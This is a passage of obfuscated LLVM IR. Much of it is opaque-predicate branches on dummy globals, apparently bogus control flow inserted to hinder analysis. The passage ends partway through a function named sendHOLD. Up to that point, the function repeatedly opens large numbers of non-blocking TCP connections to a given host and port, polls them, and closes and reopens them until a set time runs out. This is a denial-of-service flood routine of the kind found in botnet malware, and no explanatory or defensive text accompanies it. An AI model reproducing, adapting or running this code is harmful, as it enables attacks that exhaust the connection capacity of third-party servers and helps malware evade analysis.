  %366 = load i32, i32* @y.76
  %367 = sub i32 %365, 1
  %368 = mul i32 %365, %367
  %369 = urem i32 %368, 2
  %370 = icmp eq i32 %369, 0
  %371 = icmp slt i32 %366, 10
  %372 = or i1 %370, %371
  br i1 %372, label %originalBB72, label %originalBB72alteredBB

originalBB72:                                     ; preds = %originalBB72alteredBB, %364
  %373 = load i32, i32* %8, align 4
  %374 = add nsw i32 %373, 1
  store i32 %374, i32* %8, align 4
  %375 = load i32, i32* @x.75
  %376 = load i32, i32* @y.76
  %377 = sub i32 %375, 1
  %378 = mul i32 %375, %377
  %379 = urem i32 %378, 2
  %380 = icmp eq i32 %379, 0
  %381 = icmp slt i32 %376, 10
  %382 = or i1 %380, %381
  br i1 %382, label %originalBBpart276, label %originalBB72alteredBB

originalBBpart276:                                ; preds = %originalBB72
  br label %69

; <label>:383:                                    ; preds = %originalBBpart24
  br label %48

; <label>:384:                                    ; preds = %48
  %385 = load i32, i32* @x.75
  %386 = load i32, i32* @y.76
  %387 = sub i32 %385, 1
  %388 = mul i32 %385, %387
  %389 = urem i32 %388, 2
  %390 = icmp eq i32 %389, 0
  %391 = icmp slt i32 %386, 10
  %392 = or i1 %390, %391
  br i1 %392, label %originalBB78, label %originalBB78alteredBB

originalBB78:                                     ; preds = %originalBB78alteredBB, %384
  %393 = load i8*, i8** %10, align 8
  call void @llvm.stackrestore(i8* %393)
  %394 = load i32, i32* @x.75
  %395 = load i32, i32* @y.76
  %396 = sub i32 %394, 1
  %397 = mul i32 %394, %396
  %398 = urem i32 %397, 2
  %399 = icmp eq i32 %398, 0
  %400 = icmp slt i32 %395, 10
  %401 = or i1 %399, %400
  br i1 %401, label %originalBBpart280, label %originalBB78alteredBB

originalBBpart280:                                ; preds = %originalBB78
  br label %402

; <label>:402:                                    ; preds = %originalBBpart280, %31
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %52
  store i32 0, i32* %8, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %69
  %403 = load i32, i32* %8, align 4
  %404 = load i32, i32* %7, align 4
  %405 = icmp slt i32 %403, %404
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %127
  %406 = load i32, i32* %8, align 4
  %407 = sext i32 %406 to i64
  %408 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %407
  %409 = getelementptr inbounds %struct.state_t, %struct.state_t* %408, i32 0, i32 0
  %410 = load i32, i32* %409, align 8
  %411 = call i32 @close(i32 %410)
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %150
  %412 = load i32, i32* %8, align 4
  %413 = sext i32 %412 to i64
  %414 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %413
  %415 = getelementptr inbounds %struct.state_t, %struct.state_t* %414, i32 0, i32 1
  store i8 1, i8* %415, align 4
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %171
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %189
  %416 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %417 = getelementptr inbounds [16 x i64], [16 x i64]* %416, i64 0, i64 0
  %418 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %417) #4, !srcloc !6
  %419 = extractvalue { i64, i64* } %418, 0
  %420 = extractvalue { i64, i64* } %418, 1
  %421 = trunc i64 %419 to i32
  store i32 %421, i32* %18, align 4
  %422 = ptrtoint i64* %420 to i64
  %423 = trunc i64 %422 to i32
  store i32 %423, i32* %19, align 4
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %215
  %424 = load i32, i32* %8, align 4
  %425 = sext i32 %424 to i64
  %426 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %425
  %427 = getelementptr inbounds %struct.state_t, %struct.state_t* %426, i32 0, i32 0
  %428 = load i32, i32* %427, align 8
  %_ = sub i32 %428, 64
  %gen = mul i32 %_, 64
  %_23 = sub i32 %428, 64
  %gen24 = mul i32 %_23, 64
  %_25 = sub i32 %428, 64
  %gen26 = mul i32 %_25, 64
  %_27 = shl i32 %428, 64
  %_28 = sub i32 %428, 64
  %gen29 = mul i32 %_28, 64
  %_30 = sub i32 %428, 64
  %gen31 = mul i32 %_30, 64
  %_32 = shl i32 %428, 64
  %_33 = shl i32 %428, 64
  %429 = srem i32 %428, 64
  %430 = zext i32 %429 to i64
  %_34 = sub i64 1, %430
  %gen35 = mul i64 %_34, %430
  %_36 = shl i64 1, %430
  %_37 = shl i64 1, %430
  %431 = shl i64 1, %430
  %432 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %433 = load i32, i32* %8, align 4
  %434 = sext i32 %433 to i64
  %435 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %434
  %436 = getelementptr inbounds %struct.state_t, %struct.state_t* %435, i32 0, i32 0
  %437 = load i32, i32* %436, align 8
  %_38 = sub i32 0, %437
  %gen39 = add i32 %_38, 64
  %_40 = sub i32 0, %437
  %gen41 = add i32 %_40, 64
  %438 = sdiv i32 %437, 64
  %439 = sext i32 %438 to i64
  %440 = getelementptr inbounds [16 x i64], [16 x i64]* %432, i64 0, i64 %439
  %441 = load i64, i64* %440, align 8
  %_42 = sub i64 %441, %431
  %gen43 = mul i64 %_42, %431
  %_44 = sub i64 0, %441
  %gen45 = add i64 %_44, %431
  %_46 = sub i64 %441, %431
  %gen47 = mul i64 %_46, %431
  %_48 = shl i64 %441, %431
  %_49 = sub i64 0, %441
  %gen50 = add i64 %_49, %431
  %_51 = shl i64 %441, %431
  %442 = or i64 %441, %431
  store i64 %442, i64* %440, align 8
  %443 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 0
  store i64 0, i64* %443, align 8
  %444 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 1
  store i64 10000, i64* %444, align 8
  %445 = load i32, i32* %8, align 4
  %446 = sext i32 %445 to i64
  %447 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %446
  %448 = getelementptr inbounds %struct.state_t, %struct.state_t* %447, i32 0, i32 0
  %449 = load i32, i32* %448, align 8
  %_52 = sub i32 0, %449
  %gen53 = add i32 %_52, 1
  %_54 = sub i32 0, %449
  %gen55 = add i32 %_54, 1
  %_56 = shl i32 %449, 1
  %_57 = sub i32 0, %449
  %gen58 = add i32 %_57, 1
  %_59 = sub i32 0, %449
  %gen60 = add i32 %_59, 1
  %450 = add nsw i32 %449, 1
  %451 = call i32 @select(i32 %450, %struct.__sigset_t* null, %struct.__sigset_t* %11, %struct.__sigset_t* null, %struct.timeval* %12)
  store i32 %451, i32* %15, align 4
  %452 = load i32, i32* %15, align 4
  %453 = icmp eq i32 %452, 1
  br label %originalBB22

originalBB64alteredBB:                            ; preds = %originalBB64, %292
  %454 = load i32, i32* %8, align 4
  %455 = sext i32 %454 to i64
  %456 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %455
  %457 = getelementptr inbounds %struct.state_t, %struct.state_t* %456, i32 0, i32 0
  %458 = load i32, i32* %457, align 8
  %459 = call i32 @close(i32 %458)
  %460 = load i32, i32* %8, align 4
  %461 = sext i32 %460 to i64
  %462 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %461
  %463 = getelementptr inbounds %struct.state_t, %struct.state_t* %462, i32 0, i32 1
  store i8 0, i8* %463, align 4
  br label %originalBB64

originalBB68alteredBB:                            ; preds = %originalBB68, %320
  br label %originalBB68

originalBB72alteredBB:                            ; preds = %originalBB72, %364
  %464 = load i32, i32* %8, align 4
  %_73 = sub i32 0, %464
  %gen74 = add i32 %_73, 1
  %465 = add nsw i32 %464, 1
  store i32 %465, i32* %8, align 4
  br label %originalBB72

originalBB78alteredBB:                            ; preds = %originalBB78, %384
  %466 = load i8*, i8** %10, align 8
  call void @llvm.stackrestore(i8* %466)
  br label %originalBB78
}

; Function Attrs: noinline nounwind uwtable
define void @sendHOLD(i8*, i32, i32) #0 {
  %4 = load i32, i32* @x.77
  %5 = load i32, i32* @y.78
  %6 = sub i32 %4, 1
  %7 = mul i32 %4, %6
  %8 = urem i32 %7, 2
  %9 = icmp eq i32 %8, 0
  %10 = icmp slt i32 %5, 10
  %11 = or i1 %9, %10
  br i1 %11, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %3
  %12 = alloca i8*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca %struct.sockaddr_in, align 4
  %18 = alloca i8*, align 8
  %19 = alloca %struct.__sigset_t, align 8
  %20 = alloca %struct.timeval, align 8
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  %24 = alloca i8*, align 8
  %25 = alloca i32, align 4
  %26 = alloca i32, align 4
  %27 = alloca i32, align 4
  %28 = alloca i32, align 4
  %29 = alloca i32, align 4
  store i8* %0, i8** %12, align 8
  store i32 %1, i32* %13, align 4
  store i32 %2, i32* %14, align 4
  %30 = call i32 @getdtablesize() #4
  %31 = sdiv i32 %30, 2
  store i32 %31, i32* %15, align 4
  %32 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 0
  store i16 2, i16* %32, align 4
  %33 = load i32, i32* %13, align 4
  %34 = trunc i32 %33 to i16
  %35 = call zeroext i16 @htons(i16 zeroext %34) #13
  %36 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 1
  store i16 %35, i16* %36, align 2
  %37 = load i8*, i8** %12, align 8
  %38 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 2
  %39 = call i32 @getHost(i8* %37, %struct.in_addr* %38)
  %40 = icmp ne i32 %39, 0
  %41 = load i32, i32* @x.77
  %42 = load i32, i32* @y.78
  %43 = sub i32 %41, 1
  %44 = mul i32 %41, %43
  %45 = urem i32 %44, 2
  %46 = icmp eq i32 %45, 0
  %47 = icmp slt i32 %42, 10
  %48 = or i1 %46, %47
  br i1 %48, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %40, label %49, label %50

; <label>:49:                                     ; preds = %originalBBpart2
  br label %416

; <label>:50:                                     ; preds = %originalBBpart2
  %51 = load i32, i32* @x.77
  %52 = load i32, i32* @y.78
  %53 = sub i32 %51, 1
  %54 = mul i32 %51, %53
  %55 = urem i32 %54, 2
  %56 = icmp eq i32 %55, 0
  %57 = icmp slt i32 %52, 10
  %58 = or i1 %56, %57
  br i1 %58, label %originalBB9, label %originalBB9alteredBB

originalBB9:                                      ; preds = %originalBB9alteredBB, %50
  %59 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 3
  %60 = getelementptr inbounds [8 x i8], [8 x i8]* %59, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %60, i8 0, i64 8, i32 4, i1 false)
  %61 = load i32, i32* %15, align 4
  %62 = zext i32 %61 to i64
  %63 = call i8* @llvm.stacksave()
  store i8* %63, i8** %18, align 8
  %64 = alloca %struct.state_t, i64 %62, align 16
  %65 = bitcast %struct.state_t* %64 to i8*
  %66 = load i32, i32* %15, align 4
  %67 = sext i32 %66 to i64
  %68 = mul i64 %67, 5
  call void @llvm.memset.p0i8.i64(i8* %65, i8 0, i64 %68, i32 16, i1 false)
  %69 = call noalias i8* @malloc(i64 1024) #4
  store i8* %69, i8** %24, align 8
  %70 = load i8*, i8** %24, align 8
  call void @llvm.memset.p0i8.i64(i8* %70, i8 0, i64 1024, i32 1, i1 false)
  %71 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %72 = load i32, i32* %14, align 4
  %73 = add nsw i32 %71, %72
  store i32 %73, i32* %25, align 4
  %74 = load i32, i32* @x.77
  %75 = load i32, i32* @y.78
  %76 = sub i32 %74, 1
  %77 = mul i32 %74, %76
  %78 = urem i32 %77, 2
  %79 = icmp eq i32 %78, 0
  %80 = icmp slt i32 %75, 10
  %81 = or i1 %79, %80
  br i1 %81, label %originalBBpart226, label %originalBB9alteredBB

originalBBpart226:                                ; preds = %originalBB9
  br label %82

; <label>:82:                                     ; preds = %originalBBpart254, %originalBBpart226
  %83 = load i32, i32* %25, align 4
  %84 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %85 = icmp sgt i32 %83, %84
  br i1 %85, label %86, label %398

; <label>:86:                                     ; preds = %82
  store i32 0, i32* %16, align 4
  br label %87

; <label>:87:                                     ; preds = %378, %86
  %88 = load i32, i32* %16, align 4
  %89 = load i32, i32* %15, align 4
  %90 = icmp slt i32 %88, %89
  br i1 %90, label %91, label %381

; <label>:91:                                     ; preds = %87
  %92 = load i32, i32* %16, align 4
  %93 = sext i32 %92 to i64
  %94 = getelementptr inbounds %struct.state_t, %struct.state_t* %64, i64 %93
  %95 = getelementptr inbounds %struct.state_t, %struct.state_t* %94, i32 0, i32 1
  %96 = load i8, i8* %95, align 4
  %97 = zext i8 %96 to i32
  switch i32 %97, label %377 [
    i32 0, label %98
    i32 1, label %158
    i32 2, label %291
  ]

; <label>:98:                                     ; preds = %91
  %99 = call i32 @socket(i32 2, i32 1, i32 0) #4
  %100 = load i32, i32* %16, align 4
  %101 = sext i32 %100 to i64
  %102 = getelementptr inbounds %struct.state_t, %struct.state_t* %64, i64 %101
  %103 = getelementptr inbounds %struct.state_t, %struct.state_t* %102, i32 0, i32 0
  store i32 %99, i32* %103, align 8
  %104 = load i32, i32* %16, align 4
  %105 = sext i32 %104 to i64
  %106 = getelementptr inbounds %struct.state_t, %struct.state_t* %64, i64 %105
  %107 = getelementptr inbounds %struct.state_t, %struct.state_t* %106, i32 0, i32 0
  %108 = load i32, i32* %107, align 8
  %109 = load i32, i32* %16, align 4
  %110 = sext i32 %109 to i64
  %111 = getelementptr inbounds %struct.state_t, %struct.state_t* %64, i64 %110
  %112 = getelementptr inbounds %struct.state_t, %struct.state_t* %111, i32 0, i32 0
  %113 = load i32, i32* %112, align 8
  %114 = call i32 (i32, i32, ...) @fcntl(i32 %113, i32 3, i8* null)
  %115 = or i32 %114, 2048
  %116 = call i32 (i32, i32, ...) @fcntl(i32 %108, i32 4, i32 %115)
  %117 = load i32, i32* %16, align 4
  %118 = sext i32 %117 to i64
  %119 = getelementptr inbounds %struct.state_t, %struct.state_t* %64, i64 %118
  %120 = getelementptr inbounds %struct.state_t, %struct.state_t* %119, i32 0, i32 0
  %121 = load i32, i32* %120, align 8
  %122 = bitcast %struct.sockaddr_in* %17 to %struct.sockaddr*
  %123 = call i32 @connect(i32 %121, %struct.sockaddr* %122, i32 16)
  %124 = icmp ne i32 %123, -1
  br i1 %124, label %129, label %125

; <label>:125:                                    ; preds = %98
  %126 = call i32* @__errno_location() #13
  %127 = load i32, i32* %126, align 4
  %128 = icmp ne i32 %127, 115
  br i1 %128, label %129, label %136

; <label>:129:                                    ; preds = %125, %98
  %130 = load i32, i32* %16, align 4
  %131 = sext i32 %130 to i64
  %132 = getelementptr inbounds %struct.state_t, %struct.state_t* %64, i64 %131
  %133 = getelementptr inbounds %struct.state_t, %struct.state_t* %132, i32 0, i32 0
  %134 = load i32, i32* %133, align 8
  %135 = call i32 @close(i32 %134)
  br label %157

; <label>:136:                                    ; preds = %125
  %137 = load i32, i32* @x.77
  %138 = load i32, i32* @y.78
  %139 = sub i32 %137, 1
  %140 = mul i32 %137, %139
  %141 = urem i32 %140, 2
  %142 = icmp eq i32 %141, 0
  %143 = icmp slt i32 %138, 10
  %144 = or i1 %142, %143
  br i1 %144, label %originalBB28, label %originalBB28alteredBB

originalBB28:                                     ; preds = %originalBB28alteredBB, %136
  %145 = load i32, i32* %16, align 4
  %146 = sext i32 %145 to i64
  %147 = getelementptr inbounds %struct.state_t, %struct.state_t* %64, i64 %146
  %148 = getelementptr inbounds %struct.state_t, %struct.state_t* %147, i32 0, i32 1
  store i8 1, i8* %148, align 4
  %149 = load i32, i32* @x.77
  %150 = load i32, i32* @y.78
  %151 = sub i32 %149, 1
  %152 = mul i32 %149, %151
  %153 = urem i32 %152, 2
  %154 = icmp eq i32 %153, 0
  %155 = icmp slt i32 %150, 10
  %156 = or i1 %154, %155
  br i1 %156, label %originalBBpart230, label %originalBB28alteredBB

originalBBpart230:                                ; preds = %originalBB28
  br label %157

; <label>:157:                                    ; preds = %originalBBpart230, %129
  br label %377

; <label>:158:                                    ; preds = %91
  %159 = load i32, i32* @x.77
  %160 = load i32, i32* @y.78
  %161 = sub i32 %159, 1
  %162 = mul i32 %159, %161
  %163 = urem i32 %162, 2
  %164 = icmp eq i32 %163, 0
  %165 = icmp slt i32 %160, 10
  %166 = or i1 %164, %165
  br i1 %166, label %originalBB32, label %originalBB32alteredBB

originalBB32:                                     ; preds = %originalBB32alteredBB, %158
  %167 = load i32, i32* @x.77
  %168 = load i32, i32* @y.78
  %169 = sub i32 %167, 1
  %170 = mul i32 %167, %169
  %171 = urem i32 %170, 2
  %172 = icmp eq i32 %171, 0
  %173 = icmp slt i32 %168, 10
  %174 = or i1 %172, %173
  br i1 %174, label %originalBBpart234, label %originalBB32alteredBB

originalBBpart234:                                ; preds = %originalBB32
  br label %175

; <label>:175:                                    ; preds = %originalBBpart234
  %176 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %19, i32 0, i32 0
  %177 = getelementptr inbounds [16 x i64], [16 x i64]* %176, i64 0, i64 0
  %178 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %177) #4, !srcloc !7
  %179 = extractvalue { i64, i64* } %178, 0
  %180 = extractvalue { i64, i64* } %178, 1
  %181 = trunc i64 %179 to i32
  store i32 %181, i32* %26, align 4
  %182 = ptrtoint i64* %180 to i64
  %183 = trunc i64 %182 to i32
  store i32 %183, i32* %27, align 4
  br label %184

; <label>:184:                                    ; preds = %175
  br label %185

; <label>:185:                                    ; preds = %184
  %186 = load i32, i32* %16, align 4
  %187 = sext i32 %186 to i64
  %188 = getelementptr inbounds %struct.state_t, %struct.state_t* %64, i64 %187
  %189 = getelementptr inbounds %struct.state_t, %struct.state_t* %188, i32 0, i32 0
  %190 = load i32, i32* %189, align 8
  %191 = srem i32 %190, 64
  %192 = zext i32 %191 to i64
  %193 = shl i64 1, %192
  %194 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %19, i32 0, i32 0
  %195 = load i32, i32* %16, align 4
  %196 = sext i32 %195 to i64
  %197 = getelementptr inbounds %struct.state_t, %struct.state_t* %64, i64 %196
  %198 = getelementptr inbounds %struct.state_t, %struct.state_t* %197, i32 0, i32 0
  %199 = load i32, i32* %198, align 8
  %200 = sdiv i32 %199, 64
  %201 = sext i32 %200 to i64
  %202 = getelementptr inbounds [16 x i64], [16 x i64]* %194, i64 0, i64 %201
  %203 = load i64, i64* %202, align 8
  %204 = or i64 %203, %193
  store i64 %204, i64* %202, align 8
  %205 = getelementptr inbounds %struct.timeval, %struct.timeval* %20, i32 0, i32 0
  store i64 0, i64* %205, align 8
  %206 = getelementptr inbounds %struct.timeval, %struct.timeval* %20, i32 0, i32 1
  store i64 10000, i64* %206, align 8
  %207 = load i32, i32* %16, align 4
  %208 = sext i32 %207 to i64
  %209 = getelementptr inbounds %struct.state_t, %struct.state_t* %64, i64 %208
  %210 = getelementptr inbounds %struct.state_t, %struct.state_t* %209, i32 0, i32 0
  %211 = load i32, i32* %210, align 8
  %212 = add nsw i32 %211, 1
  %213 = call i32 @select(i32 %212, %struct.__sigset_t* null, %struct.__sigset_t* %19, %struct.__sigset_t* null, %struct.timeval* %20)
  store i32 %213, i32* %23, align 4
  %214 = load i32, i32* %23, align 4
  %215 = icmp eq i32 %214, 1
  br i1 %215, label %216, label %259

; <label>:216:                                    ; preds = %185
  %217 = load i32, i32* @x.77
  %218 = load i32, i32* @y.78
  %219 = sub i32 %217, 1
  %220 = mul i32 %217, %219
  %221 = urem i32 %220, 2
  %222 = icmp eq i32 %221, 0
  %223 = icmp slt i32 %218, 10
  %224 = or i1 %222, %223
  br i1 %224, label %originalBB36, label %originalBB36alteredBB

originalBB36:                                     ; preds = %originalBB36alteredBB, %216
  store i32 4, i32* %21, align 4
  %225 = load i32, i32* %16, align 4
  %226 = sext i32 %225 to i64
  %227 = getelementptr inbounds %struct.state_t, %struct.state_t* %64, i64 %226
  %228 = getelementptr inbounds %struct.state_t, %struct.state_t* %227, i32 0, i32 0
  %229 = load i32, i32* %228, align 8
  %230 = bitcast i32* %22 to i8*
  %231 = call i32 @getsockopt(i32 %229, i32 1, i32 4, i8* %230, i32* %21) #4
  %232 = load i32, i32* %22, align 4
  %233 = icmp ne i32 %232, 0
  %234 = load i32, i32* @x.77
  %235 = load i32, i32* @y.78
  %236 = sub i32 %234, 1
  %237 = mul i32 %234, %236
  %238 = urem i32 %237, 2
  %239 = icmp eq i32 %238, 0
  %240 = icmp slt i32 %235, 10
  %241 = or i1 %239, %240
  br i1 %241, label %originalBBpart238, label %originalBB36alteredBB

originalBBpart238:                                ; preds = %originalBB36
  br i1 %233, label %242, label %253

; <label>:242:                                    ; preds = %originalBBpart238
  %243 = load i32, i32* %16, align 4
  %244 = sext i32 %243 to i64
  %245 = getelementptr inbounds %struct.state_t, %struct.state_t* %64, i64 %244
  %246 = getelementptr inbounds %struct.state_t, %struct.state_t* %245, i32 0, i32 0
  %247 = load i32, i32* %246, align 8
  %248 = call i32 @close(i32 %247)
  %249 = load i32, i32* %16, align 4
  %250 = sext i32 %249 to i64
  %251 = getelementptr inbounds %struct.state_t, %struct.state_t* %64, i64 %250
  %252 = getelementptr inbounds %struct.state_t, %struct.state_t* %251, i32 0, i32 1
  store i8 0, i8* %252, align 4
  br label %258

; <label>:253:                                    ; preds = %originalBBpart238
  %254 = load i32, i32* %16, align 4
  %255 = sext i32 %254 to i64
  %256 = getelementptr inbounds %struct.state_t, %struct.state_t* %64, i64 %255
  %257 = getelementptr inbounds %struct.state_t, %struct.state_t* %256, i32 0, i32 1
  store i8 2, i8* %257, align 4
  br label %258

; <label>:258:                                    ; preds = %253, %242
  br label %274

; <label>:259:                                    ; preds = %185
  %260 = load i32, i32* %23, align 4
  %261 = icmp eq i32 %260, -1
  br i1 %261, label %262, label %273

; <label>:262:                                    ; preds = %259
  %263 = load i32, i32* %16, align 4
  %264 = sext i32 %263 to i64
  %265 = getelementptr inbounds %struct.state_t, %struct.state_t* %64, i64 %264
  %266 = getelementptr inbounds %struct.state_t, %struct.state_t* %265, i32 0, i32 0
  %267 = load i32, i32* %266, align 8
  %268 = call i32 @close(i32 %267)
  %269 = load i32, i32* %16, align 4
  %270 = sext i32 %269 to i64
  %271 = getelementptr inbounds %struct.state_t, %struct.state_t* %64, i64 %270
  %272 = getelementptr inbounds %struct.state_t, %struct.state_t* %271, i32 0, i32 1
  store i8 0, i8* %272, align 4
  br label %273

; <label>:273:                                    ; preds = %262, %259
  br label %274

; <label>:274:                                    ; preds = %273, %258
  %275 = load i32, i32* @x.77
  %276 = load i32, i32* @y.78
  %277 = sub i32 %275, 1
  %278 = mul i32 %275, %277
  %279 = urem i32 %278, 2
  %280 = icmp eq i32 %279, 0
  %281 = icmp slt i32 %276, 10
  %282 = or i1 %280, %281
  br i1 %282, label %originalBB40, label %originalBB40alteredBB

originalBB40:                                     ; preds = %originalBB40alteredBB, %274
  %283 = load i32, i32* @x.77
  %284 = load i32, i32* @y.78
  %285 = sub i32 %283, 1
  %286 = mul i32 %283, %285
  %287 = urem i32 %286, 2
  %288 = icmp eq i32 %287, 0
  %289 = icmp slt i32 %284, 10
  %290 = or i1 %288, %289
  br i1 %290, label %originalBBpart242, label %originalBB40alteredBB

originalBBpart242:                                ; preds = %originalBB40
  br label %377

; <label>:291:                                    ; preds = %91
  br label %292

; <label>:292:                                    ; preds = %291
  %293 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %19, i32 0, i32 0
  %294 = getelementptr inbounds [16 x i64], [16 x i64]* %293, i64 0, i64 0
  %295 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %294) #4, !srcloc !8
  %296 = extractvalue { i64, i64* } %295, 0
  %297 = extractvalue { i64, i64* } %295, 1
  %298 = trunc i64 %296 to i32
  store i32 %298, i32* %28, align 4
  %299 = ptrtoint i64* %297 to i64
  %300 = trunc i64 %299 to i32
  store i32 %300, i32* %29, align 4
  br label %301

; <label>:301:                                    ; preds = %292
  %302 = load i32, i32* @x.77
  %303 = load i32, i32* @y.78
  %304 = sub i32 %302, 1
  %305 = mul i32 %302, %304
  %306 = urem i32 %305, 2
  %307 = icmp eq i32 %306, 0
  %308 = icmp slt i32 %303, 10
  %309 = or i1 %307, %308
  br i1 %309, label %originalBB44, label %originalBB44alteredBB

originalBB44:                                     ; preds = %originalBB44alteredBB, %301
  %310 = load i32, i32* @x.77
  %311 = load i32, i32* @y.78
  %312 = sub i32 %310, 1
  %313 = mul i32 %310, %312
  %314 = urem i32 %313, 2
  %315 = icmp eq i32 %314, 0
  %316 = icmp slt i32 %311, 10
  %317 = or i1 %315, %316
  br i1 %317, label %originalBBpart246, label %originalBB44alteredBB

originalBBpart246:                                ; preds = %originalBB44
  br label %318

; <label>:318:                                    ; preds = %originalBBpart246
  %319 = load i32, i32* %16, align 4
  %320 = sext i32 %319 to i64
  %321 = getelementptr inbounds %struct.state_t, %struct.state_t* %64, i64 %320
  %322 = getelementptr inbounds %struct.state_t, %struct.state_t* %321, i32 0, i32 0
  %323 = load i32, i32* %322, align 8
  %324 = srem i32 %323, 64
  %325 = zext i32 %324 to i64
  %326 = shl i64 1, %325
  %327 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %19, i32 0, i32 0
  %328 = load i32, i32* %16, align 4
  %329 = sext i32 %328 to i64
  %330 = getelementptr inbounds %struct.state_t, %struct.state_t* %64, i64 %329
  %331 = getelementptr inbounds %struct.state_t, %struct.state_t* %330, i32 0, i32 0
  %332 = load i32, i32* %331, align 8
  %333 = sdiv i32 %332, 64
  %334 = sext i32 %333 to i64
  %335 = getelementptr inbounds [16 x i64], [16 x i64]* %327, i64 0, i64 %334
  %336 = load i64, i64* %335, align 8
  %337 = or i64 %336, %326
  store i64 %337, i64* %335, align 8
  %338 = getelementptr inbounds %struct.timeval, %struct.timeval* %20, i32 0, i32 0
  store i64 0, i64* %338, align 8
  %339 = getelementptr inbounds %struct.timeval, %struct.timeval* %20, i32 0, i32 1
  store i64 10000, i64* %339, align 8
  %340 = load i32, i32* %16, align 4
  %341 = sext i32 %340 to i64
  %342 = getelementptr inbounds %struct.state_t, %struct.state_t* %64, i64 %341
  %343 = getelementptr inbounds %struct.state_t, %struct.state_t* %342, i32 0, i32 0
  %344 = load i32, i32* %343, align 8
  %345 = add nsw i32 %344, 1
  %346 = call i32 @select(i32 %345, %struct.__sigset_t* null, %struct.__sigset_t* null, %struct.__sigset_t* %19, %struct.timeval* %20)
  store i32 %346, i32* %23, align 4
  %347 = load i32, i32* %23, align 4
  %348 = icmp ne i32 %347, 0
  br i1 %348, label %349, label %360

; <label>:349:                                    ; preds = %318
  %350 = load i32, i32* %16, align 4
  %351 = sext i32 %350 to i64
  %352 = getelementptr inbounds %struct.state_t, %struct.state_t* %64, i64 %351
  %353 = getelementptr inbounds %struct.state_t, %struct.state_t* %352, i32 0, i32 0
  %354 = load i32, i32* %353, align 8
  %355 = call i32 @close(i32 %354)
  %356 = load i32, i32* %16, align 4
  %357 = sext i32 %356 to i64
  %358 = getelementptr inbounds %struct.state_t, %struct.state_t* %64, i64 %357
  %359 = getelementptr inbounds %struct.state_t, %struct.state_t* %358, i32 0, i32 1
  store i8 0, i8* %359, align 4
  br label %360

; <label>:360:                                    ; preds = %349, %318
  %361 = load i32, i32* @x.77
  %362 = load i32, i32* @y.78
  %363 = sub i32 %361, 1
  %364 = mul i32 %361, %363
  %365 = urem i32 %364, 2
  %366 = icmp eq i32 %365, 0
  %367 = icmp slt i32 %362, 10
  %368 = or i1 %366, %367
  br i1 %368, label %originalBB48, label %originalBB48alteredBB

originalBB48:                                     ; preds = %originalBB48alteredBB, %360
  %369 = load i32, i32* @x.77
  %370 = load i32, i32* @y.78
  %371 = sub i32 %369, 1
  %372 = mul i32 %369, %371
  %373 = urem i32 %372, 2
  %374 = icmp eq i32 %373, 0
  %375 = icmp slt i32 %370, 10
  %376 = or i1 %374, %375
  br i1 %376, label %originalBBpart250, label %originalBB48alteredBB

originalBBpart250:                                ; preds = %originalBB48
  br label %377

; <label>:377:                                    ; preds = %originalBBpart250, %originalBBpart242, %157, %91
  br label %378

; <label>:378:                                    ; preds = %377
  %379 = load i32, i32* %16, align 4
  %380 = add nsw i32 %379, 1
  store i32 %380, i32* %16, align 4
  br label %87

; <label>:381:                                    ; preds = %87
  %382 = load i32, i32* @x.77
  %383 = load i32, i32* @y.78
  %384 = sub i32 %382, 1
  %385 = mul i32 %382, %384
  %386 = urem i32 %385, 2
  %387 = icmp eq i32 %386, 0
  %388 = icmp slt i32 %383, 10
  %389 = or i1 %387, %388
  br i1 %389, label %originalBB52, label %originalBB52alteredBB

originalBB52:                                     ; preds = %originalBB52alteredBB, %381
  %390 = load i32, i32* @x.77
  %391 = load i32, i32* @y.78
  %392 = sub i32 %390, 1
  %393 = mul i32 %390, %392
